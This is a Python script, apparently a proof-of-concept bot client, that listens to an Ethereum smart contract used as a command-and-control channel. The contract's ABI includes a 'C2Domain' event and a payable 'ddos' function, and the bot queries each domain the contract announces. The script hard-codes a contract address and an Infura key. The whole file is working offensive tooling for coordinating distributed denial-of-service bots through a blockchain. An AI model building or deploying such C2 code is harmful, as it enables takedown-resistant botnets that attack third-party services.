import requests
from web3 import Web3
import asyncio
import dns
import dns.resolver

abi = [
	{
		"inputs": [],
		"stateMutability": "nonpayable",
		"type": "constructor"
	},
	{
		"anonymous": False,
		"inputs": [
			{
				"indexed": False,
				"internalType": "string",
				"name": "domain",
				"type": "string"
			}
		],
		"name": "C2Domain",
		"type": "event"
	},
	{
		"anonymous": False,
		"inputs": [
			{
				"indexed": False,
				"internalType": "address",
				"name": "oldOwner",
				"type": "address"
			},
			{
				"indexed": False,
				"internalType": "address",
				"name": "newOwner",
				"type": "address"
			}
		],
		"name": "OwnerSet",
		"type": "event"
	},
	{
		"inputs": [
			{
				"internalType": "string",
				"name": "domain",
				"type": "string"
			}
		],
		"name": "ddos",
		"outputs": [],
		"stateMutability": "payable",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "getOwner",
		"outputs": [
			{
				"internalType": "address",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "withdraw",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	}
]
c2ContractAddress = "0x7b8459ca6CAabC727354eeF294B6349d3aC28E27"
web3 = Web3(Web3.WebsocketProvider('wss://ropsten.infura.io/ws/v3/1c47be13b9ef4862a3b62937188c8a64'))

def handle_event(event):
    domain = event['args']['domain']
    print(f"Domain Emitted: {domain}")
    print("Sending Query...")
    #r = requests.get(domain)
    print(dns.resolver.query(domain, 'A'))
    #print(r.status_code)


async def log_loop(event_filter, poll_interval):
    while True:
        for C2Domain in event_filter.get_new_entries():
            handle_event(C2Domain)
        await asyncio.sleep(poll_interval)

def main():
    myContract = web3.eth.contract(address=c2ContractAddress, abi=abi)
    event_filter = myContract.events.C2Domain.createFilter(fromBlock='latest')

    loop = asyncio.get_event_loop()
    try:
        loop.run_until_complete(
            asyncio.gather(
                log_loop(event_filter, 2)))
                # log_loop(block_filter, 2),
                # log_loop(tx_filter, 2)))
    finally:
        # close loop to free up system resources
        loop.close()


if __name__ == "__main__":
    main()
